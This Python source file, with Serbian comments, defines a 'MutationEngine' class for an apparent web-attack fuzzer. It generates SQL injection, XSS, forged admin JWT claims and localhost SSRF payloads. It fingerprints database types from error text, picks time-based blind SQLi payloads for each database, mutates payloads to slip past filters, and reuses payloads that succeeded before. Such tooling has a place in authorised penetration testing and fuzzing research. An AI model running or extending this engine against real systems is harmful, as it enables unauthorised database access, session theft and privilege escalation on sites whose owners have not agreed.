import random
import re
import hashlib
import json
from datetime import datetime

class MutationEngine:
    def __init__(self):
        self.attack_types = ["SQLi", "XSS", "JWT", "SSRF"]

    def detect_db_type(self, response_text):
        """Heuristički proceni tip baze iz odgovora"""
        if "SQL syntax" in response_text:
            return "MySQL"
        elif "pg_query" in response_text or "PostgreSQL" in response_text:
            return "PostgreSQL"
        elif "SQL Server" in response_text or "Microsoft" in response_text:
            return "MSSQL"
        elif "MongoServerError" in response_text or "BSON" in response_text:
            return "MongoDB"
        return "Unknown"

    def generate_payload(self, attack_vector):
        """Generiši payload prema tipu napada"""
        if attack_vector == "SQLi":
            return f"' OR {random.randint(1, 10)}={random.randint(1, 10)} --"
        elif attack_vector == "XSS":
            return f'<script>alert("{random.choice(["X", "Y", "Z"])}")</script>'
        elif attack_vector == "JWT":
            return {
                "role": "admin",
                "exp": random.randint(1000000000, 2000000000)
            }
        elif attack_vector == "SSRF":
            port = random.randint(8000, 9000)
            return f"http://127.0.0.1:{port}/internal"
        else:
            return f"{attack_vector}_test"

    def mutate_payload(self, payload):
        """Mutacija postojećeg payload-a"""
        if isinstance(payload, str):
            mutations = [
                payload[::-1],
                payload + "--",
                payload.replace("\"", "\\\""),
                ''.join(random.choice([c.upper(), c.lower()]) for c in payload)
            ]
            return random.choice(mutations)

        elif isinstance(payload, dict):
            mutated = payload.copy()
            if "role" in mutated:
                mutated["role"] = "superadmin"
            return [mutated]

        return [payload]

    def adapt_to_environment(self, db_type):
        """Prilagodi payload bazi podataka"""
        if db_type == "MySQL":
            return "SELECT SLEEP(5)"
        elif db_type == "PostgreSQL":
            return "SELECT pg_sleep(5)"
        elif db_type == "MongoDB":
            return '{"$where":"sleep(5000)"}'
        return "SELECT delay(5)"

    def load_successful_history(self, attack_type, history_file="data/fuzz_history.json"):
        try:
            with open(history_file, "r") as f:
                history = json.load(f)
                return [h["payload"] for h in history.get(attack_type, []) if h["success"]]
        except:
            return []
